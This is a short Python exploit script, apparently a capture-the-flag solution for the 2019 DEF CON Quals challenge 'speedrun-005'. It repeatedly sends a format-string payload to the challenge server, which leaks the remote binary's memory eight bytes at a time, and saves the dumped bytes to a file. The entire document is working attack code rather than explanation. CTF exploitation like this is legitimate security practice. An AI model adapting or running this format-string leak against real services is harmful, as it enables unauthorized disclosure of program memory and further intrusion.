from ptrlib import *
from time import sleep

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elf = ELF("./speedrun-005")

binary = b''

try:
    x = 0
    for i in range(0x1000):
        if x % 0x100 == 0:
            print(hex(i))
        sock = Socket("speedrun-005.quals2019.oooverflow.io", 31337)
        payload = b'%7$s\xff\xff\xff\xff' + p64(0x400000 + x)
        sock.send(payload)
        sock.recvuntil("Interesting ")
        data = sock.recv()[:8]
        if b'\xff' in data:
            if data.index(b'\xff') == 0:
                data = b'\x00'
            else:
                data = data[:data.index(b'\xff')]
        binary += data
        x += len(data)
        sock.close()
except:
    pass

open("remote.bin", "wb").write(binary)
